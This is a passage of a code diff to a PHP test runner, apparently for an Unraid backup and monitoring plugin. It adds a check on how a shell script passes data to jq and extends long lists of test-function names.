+    $src = (string) file_get_contents(OFFICE_DIR . '/backup/lib/common.sh');
+    check('results 2.84: jq is fed from files, never from an argument (--slurpfile old, hist, local; no --argjson of them)',
+        preg_match('/results_write\(\) \{.*?--slurpfile old .*?--slurpfile hist .*?--slurpfile local .*?\n\}/s', $src, $m) === 1 && !str_contains($m[0], '--argjson old') && !str_contains($m[0], '--argjson hist'));
+    $hist([$line('20261001-0100', 1000, ['kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 5, 'finished' => 990]]]])]);
     // a dry run or a check never writes it; nor a link
     @unlink("$data/state/results.json");
     $run(['mode' => 'dry', 'run' => 'x', 'finished' => 6000]);
@@ -59552,10 +59751,10 @@ function testBackupAnewChoice(): void
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSnapPlanIdNeverReused', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testCaretakerAckDrift', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackKeyRedirect', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testMoverJackTruthRest', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testStreamerShares', 'testJackYield',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus'],
+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus'],
           'hardening' => ['testRequestTypes', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin', 'testHostShell', 'testOnlyOfficeCron'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
